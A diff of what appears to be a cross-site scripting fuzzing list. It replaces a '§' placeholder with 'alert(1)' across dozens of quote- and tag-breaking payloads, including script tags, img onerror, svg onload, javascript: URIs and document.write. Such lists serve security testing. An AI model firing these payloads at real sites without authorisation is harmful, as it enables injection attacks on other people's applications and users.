@@ -1,42 +1,42 @@
-﻿§
- §
-§;
-§)
-§/>
-§>
-§//
-;§
->§
-/>§
-'§
-'§'
-`'§
-;'§'
-'>§'
-'/>§'
-'§;'
-"§
-"§"
-`"§"`
-;"§"
-;'"§"'
-;"'"§'"
-";§"
-'";§"'
-"';§'"
-`"';§'"`
-">§"
-"/>§"
-"§;"
-javascript:§
-javascript:§;
-<img src=test onerror=§>
-<script>§</script>
-><script>§</script><!--
-/><script>§</script><!--
-<svg onload=§>
-document.write('§')
-document.write('§');
+﻿alert(1)
+ alert(1)
+alert(1);
+alert(1))
+alert(1)/>
+alert(1)>
+alert(1)//
+;alert(1)
+>alert(1)
+/>alert(1)
+'alert(1)
+'alert(1)'
+`'alert(1)
+;'alert(1)'
+'>alert(1)'
+'/>alert(1)'
+'alert(1);'
+"alert(1)
+"alert(1)"
+`"alert(1)"`
+;"alert(1)"
+;'"alert(1)"'
+;"'"alert(1)'"
+";alert(1)"
+'";alert(1)"'
+"';alert(1)'"
+`"';alert(1)'"`
+">alert(1)"
+"/>alert(1)"
+"alert(1);"
+javascript:alert(1)
+javascript:alert(1);
+<img src=test onerror=alert(1)>
+<script>alert(1)</script>
+><script>alert(1)</script><!--
+/><script>alert(1)</script><!--
+<svg onload=alert(1)>
+document.write('alert(1)')
+document.write('alert(1)');
 <script>alert(123)</script>
 &lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;
 <img src=x onerror=alert(123) />
